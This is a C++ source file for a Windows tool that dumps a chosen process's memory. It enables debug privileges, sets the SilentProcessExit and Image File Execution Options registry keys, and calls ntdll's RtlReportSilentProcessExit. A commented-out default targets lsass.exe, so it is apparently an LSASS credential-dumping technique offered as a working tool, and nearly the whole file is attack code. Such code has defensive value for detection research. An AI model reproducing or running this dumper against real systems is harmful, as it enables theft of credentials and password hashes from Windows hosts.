#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

/*
A super weak attempt on implementing process dump using RtlReportSilentProcessExit ntdll.dll function - but it works and was fun to write =D 
*/


// Function prototypes
BOOL EnablePrivilege(PCWSTR privilege);
BOOL SetRegKey(LPTSTR pszLogname, LPTSTR pszSubKey, LPTSTR pszDumpLocation, LPTSTR pszValue, DWORD dwNum);
HANDLE GetProcessByName(PCWSTR ProcessName);

typedef NTSTATUS(WINAPI* FRtlReportSilentProcessExit)(HANDLE ProcessHandle, NTSTATUS ExisStatus);
FRtlReportSilentProcessExit g_fRtlReportSilentProcessExit = NULL;

int wmain(int argc, wchar_t* argv[])
{

    if (argc < 3) {
        printf("[-] Usage: dump.exe application_name dump_directory\n");
        return TRUE;
    }

    LPCTSTR pszAppName = argv[1];
    LPCTSTR pszDumpLocation = argv[2];

    //LPCTSTR pszAppName = L"lsass.exe";
    //LPCTSTR pszDumpLocation = L"C:\\TEMP";

    BOOL ret = EnablePrivilege(SE_DEBUG_NAME);
    if (!ret) {
        printf("[-] EnablePrivilege fail.\n");
        return FALSE;
    }
    else {
        printf("[+] EnablePrivilege success.\n");
    }

    LPCTSTR pszSubKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
    LPCTSTR pszValue = L"GlobalFlag";
    DWORD dwNum = 0x200;

    ret = SetRegKey((LPTSTR)pszAppName, (LPTSTR)pszSubKey, NULL, (LPTSTR)pszValue, dwNum);
    if (ret) {
        printf("[+] SetRegKey success.\n");
    }

    pszSubKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit";
    pszValue = L"ReportingMode";
    dwNum = 0x2;

    ret = SetRegKey((LPTSTR)pszAppName, (LPTSTR)pszSubKey, NULL, (LPTSTR)pszValue, dwNum);
    if (ret) {
        printf("[+] SetRegKey success.\n");
    }
    pszValue = L"DumpType";
    dwNum = 0x2;

    ret = SetRegKey((LPTSTR)pszAppName, (LPTSTR)pszSubKey, NULL, (LPTSTR)pszValue, dwNum);
    if (ret) {
        printf("[+] SetRegKey success.\n");
    }

    pszValue = L"LocalDumpFolder";
    ret = SetRegKey((LPTSTR)pszAppName, (LPTSTR)pszSubKey, (LPTSTR)pszDumpLocation, (LPTSTR)pszValue, dwNum);

    // Locate RtlReportSilentProcessExit inside ntdll.dll
    g_fRtlReportSilentProcessExit = (FRtlReportSilentProcessExit)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlReportSilentProcessExit");
    if (g_fRtlReportSilentProcessExit == NULL) {
        printf("[-] Could not locate ntdll!RtlReportSilentProcessExit.\n");
        return FALSE;
    }
    else {
        printf("[+] RtlReportSilentProcessExit found.\n");
    }

    // Get a handle to the process you need to dump
    HANDLE hProcess = GetProcessByName(pszAppName);
    if (hProcess == NULL) {
        printf("[-] GetProcessByName fail.\n");
        return FALSE;
    }
    else {
        printf("[+] GetProcessByName success.\n");
    }

    // Call RtlReportSilentProcessExit
    NTSTATUS status = g_fRtlReportSilentProcessExit(hProcess, 0);
    if (status == 0) {
        printf("[+] RtlReportSilentProcessExit success.\n");
    }
    else {
        printf("[-] RtlReportSilentProcessExit fail %d\n", status);
    }

    CloseHandle(hProcess);

    return 0;
}

BOOL EnablePrivilege(PCWSTR privilege) {

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValue(nullptr, privilege, &tp.Privileges[0].Luid)) {
        return FALSE;
    }

    BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hToken);
    return ret;
}

BOOL SetRegKey(LPTSTR pszAppName, LPTSTR pszSubKey, LPTSTR pszDumpLocation, LPTSTR pszValue, DWORD dwNum) {

    HKEY hKey;
    TCHAR szBuf[MAX_PATH];

    wsprintf(szBuf, L"%s\\%s", pszSubKey, pszAppName);

    if (RegCreateKey(HKEY_LOCAL_MACHINE, szBuf, &hKey) != ERROR_SUCCESS) {
        printf("[-] RegCreateKey failed.\n");
        return FALSE;
    }

    if(pszDumpLocation != NULL) {
        if (RegSetValueEx(hKey,
            pszValue,
            0,
            REG_EXPAND_SZ,
            (LPBYTE)pszDumpLocation,
            (DWORD)lstrlen(szBuf) + 1) != ERROR_SUCCESS) {
            printf("[-] RegSetValueEx failed.\n");
            return FALSE;
        }
    }
    else {
        if (RegSetValueEx(hKey,
            pszValue,
            0,
            REG_DWORD,
            (LPBYTE)&dwNum,
            sizeof(DWORD)) != ERROR_SUCCESS) {
            printf("[-] RegSetValueEx failed.\n");
            return FALSE;
        }
    }

    if (RegCloseKey(hKey) != ERROR_SUCCESS) {
        printf("[+] RegCloseKey fail.\n");
    }
}

HANDLE GetProcessByName(PCWSTR ProcessName) {
    
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(PROCESSENTRY32));
    process.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &process)) {
        do {
            if (_wcsicmp(process.szExeFile, ProcessName) == 0) {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);

    if (pid != 0) {
        return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
}
